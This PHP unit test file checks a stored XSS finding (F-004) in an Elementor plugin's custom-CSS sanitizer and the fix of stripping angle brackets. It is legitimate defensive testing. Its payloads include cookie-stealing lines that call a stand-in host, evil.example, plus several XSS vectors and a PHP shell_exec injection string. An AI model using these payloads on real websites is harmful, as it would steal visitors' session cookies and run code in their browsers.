<?php
/**
 * Unit tests for F-004: Stored XSS via CSS HTML injection.
 *
 * Finding:   F-004 (High)
 * File:      includes/abilities/class-custom-code-abilities.php:209–210
 * Pattern:   PAT-HTML-IN-STRUCTURED-CONTEXT
 *
 * Vulnerability description
 * -------------------------
 * execute_add_custom_css() applies two regexes to caller-supplied CSS:
 *   (1) Strip PHP short-tags:  /<\?(=|php)(.+?)\?>/is
 *   (2) Strip script elements: /<script[^>]*>.*?<\/script>/is
 *
 * Neither regex strips `</style>` or arbitrary angle brackets.  The payload
 *   </style><img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">
 * passes both filters unchanged and is stored to the `custom_css` post meta.
 * Elementor later renders the page as:
 *   <style>[existing CSS]</style><img src=x onerror="...">
 * The img executes JavaScript for every subsequent page visitor.
 *
 * TDD contract
 * ------------
 * Each test in this file asserts CORRECT behaviour.
 *
 *   BEFORE the fix  → tests that verify the correct behaviour FAIL
 *                      (proving the vulnerability exists).
 *   AFTER the fix   → all tests PASS.
 *
 * The fix is: replace the two-regex approach with
 *   $css = preg_replace('/[<>]/', '', $css);
 * Valid CSS never contains angle brackets, so stripping them is safe.
 *
 * @package Elementor_MCP\Tests\Security
 * @since   1.0.0
 */

namespace Elementor_MCP\Tests\Security;

use PHPUnit\Framework\TestCase;

/**
 * @covers \Elementor_MCP_Custom_Code_Abilities::execute_add_custom_css
 */
class F004CssHtmlInjectionTest extends TestCase {

	// -------------------------------------------------------------------------
	// Helper: reproduce the CURRENT (buggy) sanitization from lines 209–210
	// -------------------------------------------------------------------------

	/**
	 * Applies the current two-regex sanitization from execute_add_custom_css().
	 *
	 * Extracted verbatim so the test is authoritative: if the source is changed,
	 * this helper must be updated to match, and the test will then correctly
	 * reflect whether the change is sufficient.
	 *
	 * Source: includes/abilities/class-custom-code-abilities.php:209–210
	 */
	private function apply_current_sanitization( string $css ): string {
		// Line 209:
		$css = preg_replace( '/<\?(=|php)(.+?)\?>/is', '', $css );
		// Line 210:
		$css = preg_replace( '/<script[^>]*>.*?<\/script>/is', '', $css );
		return $css;
	}

	/**
	 * Applies the CORRECT sanitization described in the F-004 fix recommendation.
	 *
	 * Valid CSS never contains angle brackets; stripping them is a safe,
	 * complete defence against HTML injection in a CSS context.
	 */
	private function apply_correct_sanitization( string $css ): string {
		return preg_replace( '/[<>]/', '', $css );
	}

	// -------------------------------------------------------------------------
	// Tests: current sanitization is INSUFFICIENT (tests FAIL before fix)
	// -------------------------------------------------------------------------

	/**
	 * @test
	 * F-004 — Closing style tag passes current sanitization unchanged.
	 *
	 * The exact payload confirmed by ADVERSARIAL-1 (Step 2):
	 *   </style><img src=x onerror="fetch(…)">
	 *
	 * This test FAILS before the fix because the current code does not strip
	 * `</style>`.  After the fix it PASSES.
	 *
	 * @group security
	 * @group f-004
	 */
	public function test_style_closing_tag_is_stripped_from_css(): void {
		$payload = '</style><img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">';

		$result = $this->apply_current_sanitization( $payload );

		$this->assertStringNotContainsString(
			'</style>',
			$result,
			'F-004: CSS sanitization must strip </style> to prevent HTML injection that ' .
			'breaks out of the <style> block. Current two-regex approach does not. ' .
			'Fix: replace with preg_replace(\'/[<>]/\', \'\', $css).'
		);
	}

	/**
	 * @test
	 * F-004 — onerror handler payload passes current sanitization unchanged.
	 *
	 * This test FAILS before the fix.
	 *
	 * @group security
	 * @group f-004
	 */
	public function test_img_tag_with_onerror_is_stripped_from_css(): void {
		$payload = '</style><img src=x onerror="alert(document.domain)">';

		$result = $this->apply_current_sanitization( $payload );

		$this->assertStringNotContainsString(
			'<img',
			$result,
			'F-004: CSS sanitization must strip HTML tags including <img> from CSS input.'
		);
	}

	/**
	 * @test
	 * F-004 — Angle brackets are not present anywhere in sanitized CSS.
	 *
	 * This is the minimal correctness property for CSS in a <style> context:
	 * valid CSS never requires angle brackets.
	 *
	 * This test FAILS before the fix (current code leaves `<` and `>` intact).
	 *
	 * @group security
	 * @group f-004
	 */
	public function test_angle_brackets_are_absent_after_current_sanitization(): void {
		$payload = 'body { color: red; }</style><svg/onload=alert(1)>';

		$result = $this->apply_current_sanitization( $payload );

		$this->assertDoesNotMatchRegularExpression(
			'/[<>]/',
			$result,
			'F-004: Sanitized CSS must contain no angle brackets. ' .
			'Any `<` or `>` in a CSS string can be used to break out of the <style> block.'
		);
	}

	// -------------------------------------------------------------------------
	// Tests: current sanitization IS sufficient for the cases it handles
	// (these should remain passing before and after the fix)
	// -------------------------------------------------------------------------

	/**
	 * @test
	 * PHP short-tags are stripped — the existing regex handles this correctly.
	 *
	 * @group security
	 * @group f-004
	 */
	public function test_php_short_tags_are_stripped(): void {
		$payload = 'body { color: <?= shell_exec("id") ?>; }';
		$result  = $this->apply_current_sanitization( $payload );

		$this->assertStringNotContainsString( '<?=', $result, 'PHP short-tags should be stripped.' );
		$this->assertStringNotContainsString( '?>', $result, 'PHP short-tag close should be stripped.' );
	}

	/**
	 * @test
	 * Inline script blocks are stripped — the existing regex handles this.
	 *
	 * @group security
	 * @group f-004
	 */
	public function test_script_tags_are_stripped(): void {
		$payload = 'body { color: red; }<script>alert(1)</script>';
		$result  = $this->apply_current_sanitization( $payload );

		$this->assertStringNotContainsString( '<script', $result, '<script> should be stripped.' );
	}

	/**
	 * @test
	 * Valid CSS is preserved intact after the correct sanitization.
	 *
	 * The fix must not break legitimate CSS rules.
	 *
	 * @group security
	 * @group f-004
	 */
	public function test_valid_css_is_preserved_after_correct_sanitization(): void {
		$valid_css = implode( "\n", [
			'selector { color: #ff0000; }',
			'selector:hover { transform: scale(1.05); opacity: 0.9; }',
			'selector .child { font-size: 1.2rem; line-height: 1.6; }',
			'@media (max-width: 768px) { selector { display: none; } }',
		] );

		$result = $this->apply_correct_sanitization( $valid_css );

		// Correct CSS contains no angle brackets, so output should equal input.
		$this->assertSame(
			$valid_css,
			$result,
			'The correct sanitization (strip angle brackets) must not alter valid CSS.'
		);
	}

	/**
	 * @test
	 * Correct sanitization strips the full ADVERSARIAL-1 payload.
	 *
	 * @group security
	 * @group f-004
	 */
	public function test_correct_sanitization_strips_adversarial_payload(): void {
		$payload = '</style><img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">';
		$result  = $this->apply_correct_sanitization( $payload );

		// Angle brackets are what make the payload dangerous; stripping them
		// breaks the HTML tag structure even if attribute-name text remains.
		$this->assertDoesNotMatchRegularExpression(
			'/[<>]/',
			$result,
			'Correct sanitization must strip all angle brackets from the payload.'
		);
	}

	/**
	 * @test
	 * Correct sanitization strips a variety of HTML injection vectors.
	 *
	 * @dataProvider htmlInjectionVectorProvider
	 * @group security
	 * @group f-004
	 */
	public function test_correct_sanitization_strips_html_vectors( string $payload ): void {
		$result = $this->apply_correct_sanitization( $payload );

		$this->assertDoesNotMatchRegularExpression(
			'/[<>]/',
			$result,
			"Correct sanitization failed on payload: {$payload}"
		);
	}

	/** @return array<string, array{string}> */
	public static function htmlInjectionVectorProvider(): array {
		return [
			'style close + img onerror'   => [ '</style><img onerror=alert(1)>' ],
			'style close + svg onload'    => [ '</style><svg/onload=alert(1)>' ],
			'style close + input onfocus' => [ '</style><input onfocus=alert(1) autofocus>' ],
			'style close + link'          => [ '</style><link rel=stylesheet href=//evil.example/>' ],
			'style close + script'        => [ '</style><script>fetch("//evil.example/?"+document.cookie)</script>' ],
			'open style override'         => [ 'a{}</style><style>body{background:url(//evil.example)}' ],
		];
	}
}
